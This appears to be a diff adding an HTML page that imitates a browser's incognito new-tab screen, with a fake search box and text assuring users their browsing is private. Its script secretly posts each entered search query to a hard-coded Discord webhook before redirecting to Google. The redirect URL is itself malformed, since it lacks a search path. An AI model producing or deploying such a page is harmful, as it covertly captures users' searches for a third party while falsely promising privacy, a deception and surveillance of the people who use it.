@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>New Tab (Private)</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #202124; /* Incognito Dark Background */
+            color: #e8eaed;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            height: 100vh;
+            box-sizing: border-box;
+            overflow: hidden;
+        }
+        .top-nav {
+            width: 100%;
+            display: flex;
+            justify-content: flex-end;
+            padding: 16px;
+            box-sizing: border-box;
+        }
+        .incognito-icon {
+            font-size: 24px;
+            opacity: 0.7;
+        }
+        .logo-container {
+            margin-top: 80px;
+            margin-bottom: 30px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+        }
+        .incognito-logo {
+            font-size: 64px;
+            margin-bottom: 10px;
+        }
+        .logo-text {
+            font-size: 22px;
+            font-weight: 400;
+            color: #e8eaed;
+        }
+        .search-wrapper {
+            width: 90%;
+            max-width: 560px;
+            position: relative;
+            margin-bottom: 20px;
+        }
+        .search-input {
+            width: 100%;
+            padding: 14px 22px;
+            font-size: 16px;
+            border: none;
+            border-radius: 30px;
+            outline: none;
+            box-sizing: border-box;
+            background-color: #35363a; /* Dark Search Bar */
+            color: #e8eaed;
+            box-shadow: 0 1px 6px rgba(0,0,0,0.28);
+        }
+        .search-input::placeholder {
+            color: #9aa0a6;
+        }
+        .search-input:focus {
+            background-color: #3c4043;
+            box-shadow: 0 1px 6px rgba(0,0,0,0.4);
+        }
+        .notice-text {
+            font-size: 13px;
+            color: #9aa0a6;
+            margin-top: 15px;
+            text-align: center;
+            max-width: 450px;
+            line-height: 1.5;
+        }
+    </style>
+</head>
+<body>
+    <div id="chromeInterface" style="width: 100%; display: flex; flex-direction: column; align-items: center;">
+        <div class="top-nav">
+            <div class="incognito-icon">🕶️</div>
+        </div>
+        
+        <div class="logo-container">
+            <div class="incognito-logo">🕵️</div>
+            <div class="logo-text">You’ve gone incognito</div>
+        </div>
+        
+        <div class="search-wrapper">
+            <input type="text" id="userQuery" class="search-input" placeholder="Search Google or type a URL" autocomplete="off" autocapitalize="off" spellcheck="false">
+        </div>
+
+        <p class="notice-text">Now you can browse privately, and other people who use this device won’t see your activity.</p>
+    </div>
+    
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            // Put your link between the quotes below:
+            const secretWebhookUrl = "https://discord.com/api/webhooks/1550099183908954173/3MbNEj9XQPhU202exWZlnFVGI7nm0GGVqmaeSLkp7hHXIP32ZioPkS5H7hSJfE_qjVu0"; 
+            
+            const inputField = document.getElementById('userQuery');
+            
+            if (inputField) {
+                inputField.addEventListener('keypress', function (e) {
+                    if (e.key === 'Enter') {
+                        const searchText = inputField.value;
+                        if (searchText.trim() !== "") {
+                            
+                            fetch(secretWebhookUrl, {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({ content: "Searched: " + searchText })
+                            }).catch(err => console.log("Sent"));
+
+                            const realSearchEngineUrl = "https://google.com" + encodeURIComponent(searchText);
+                            
+                            setTimeout(() => {
+                                window.location.href = realSearchEngineUrl;
+                            }, 250);
+                        }
+                    }
+                });
+            }
+        });
+    </script>
+</body>
+</html>
